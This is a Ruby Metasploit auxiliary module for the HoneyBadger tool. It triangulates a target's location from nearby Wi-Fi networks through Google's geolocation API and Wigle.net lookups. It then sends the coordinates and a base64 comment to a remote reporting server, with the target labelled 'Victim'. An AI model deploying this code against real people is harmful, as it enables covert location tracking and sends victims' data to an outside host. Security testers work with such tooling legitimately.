module Msf

	module Auxiliary::Badger_Report

	require 'net/https'
	require 'net/http'
	require 'rex/proto/http/client'        

	def initialize(info = {})
		super
		
		register_options(
			[
			OptString.new('BADGER_TGT',   [ true, "Badger Target", "Victim" ]),
			OptString.new('BADGER_URI',   [ true, "Bager Reporting Page", "http://honeybadger.lanmaster53.com/service.php"]),
			], self.class
			)
	end

	class Wlan_net
		def initialize(ssid,mac,rssi)
			@ssid=ssid
			@mac=mac
			@rssi=rssi
		end
		def ssid
			@ssid
		end
		def mac
			@mac
		end
		def rssi
			@rssi
		end
	end

	class Position
		def initialize(lat,lon,acc)
			@lat=lat
			@lon=lon
			@acc=acc
		end
		def lat
			@lat
		end
		def lon
			@lon
		end
		def acc
			@acc
		end
	end    

	def return_uri
		uri = URI("#{datastore['BADGER_URI']}")
		return uri
	end

	def wlan_triangulate(survey)
		c = Rex::Proto::Http::Client.new("maps.googleapis.com",443,{},true)
		uri = "/maps/api/browserlocation/json?browser=firefox&sensor=true#{survey}"
		r = c.request_raw('uri'=>uri)
		resp=c.send_recv(r)
		res=resp.body            
		if res =~ /(accuracy(.)+.,)/
			acc = $1.sub("accuracy\" :","").chomp(",").gsub!(/\s+/, "")
		end
		if res =~ /(lat(.)+.,)/
			lat = $1.sub("lat\" :","").chomp(",").gsub!(/\s+/, "")
		end           
		if res =~ /(lng(.)+.)/
			lon = $1.sub("lng\" :","").gsub!(/\s+/, "")
		end
		pos = Position.new(lat,lon,acc)
		print_status("Google Triangulated Position:  lat: #{pos.lat}, lon: #{pos.lon}, acc: #{pos.acc}")            
		if acc == "24000.0"
			print_status("Location not precise. Suggest using aux/badger_wigle to search specific BSSID")
		end            
		return pos
	end        

	def wigle_search(user,pass,bssid)        
		c = Rex::Proto::Http::Client.new("wigle.net",443,{},true)
		req = c.request_cgi(
			'method'		=> 'GET',
			'uri'			=> '/gps/gps/main/login',
			'vars_get'		=> { 'credential_0' => user, 'credential_1' => pass }
			)
		resp = c.send_recv(req, 500)
		if (resp.code != 200)
			print_status("Wigle.Net responded with error: #{resp.code}")
			return nil
		else
			print_status("Logged Into Wigle.Net Successfully")
			headers = "#{resp.headers}"            
			cookie = headers.slice(headers.index('auth='),headers.length)
			cookie = cookie.slice(0,cookie.index(';')+1)
		end                         
		req = c.request_cgi(
			'method'		=> 'POST',
			'uri'			=> '/gps/gps/main/confirmquery/',
			'vars_get'		=> { 'netid' => bssid },
			'headers'      =>	{'Cookie'       => cookie,}
			)
		resp = c.send_recv(req, 500)                         
		if (resp.code != 200)
			print_status("Wigle.Net responded with error: #{resp.code}")
			return nil
		else
			results = resp.body
			if results.include? 'too many queries'
				print_status("Query rate exceeded.")
				return nil
			end            
			if results =~ /(maplat=(.)+&maplon)/
				lat=$1
				lat=lat.sub("maplat=","").chomp("&maplon")
			else
				lat="N/A"
			end
			if results =~ /(maplon=(.)+&mapzoom)/
				lon=$1
				lon=lon.sub("maplon=","").chomp("&mapzoom")
			else
				lon="N/A"
			end
			geoCoords = "#{lat}, #{lon}"
			if geoCoords.include? "N/A"
				print_status("BSSID not found in Wigle.Net")
				return nil
			else
				acc = "100.0"
				pos = Position.new(lat,lon,acc)
				return pos
			end
		end      
	end       


	def report_results(pos,agent,comment=nil)        
		uri = URI("#{datastore['BADGER_URI']}")
		port = uri.port
		host = uri.host
		path = uri.path
		ssl = false
		if uri.scheme == "https"
			ssl = true
		end
		c = Rex::Proto::Http::Client.new(host,port,{},ssl)
		path << "?target=#{datastore['BADGER_TGT']}&agent=#{agent}"
		if (pos.acc)
			path << "&lat=#{pos.lat}&lng=#{pos.lon}&acc=#{pos.acc}"
		end
		if (comment!=nil)
		b64_comment = Rex::Text.encode_base64(comment)
			path << "&comment=#{b64_comment}"
		end
		r = c.request_raw('uri'=>path)
		resp=c.send_recv(r)
		if resp.code == 200
			print_status("Badger report sent to: #{datastore['BADGER_URI']}")
		else
			print_status("Badger report failed to: #{datastore['BADGER_URI']}")
		end
	end
end
end
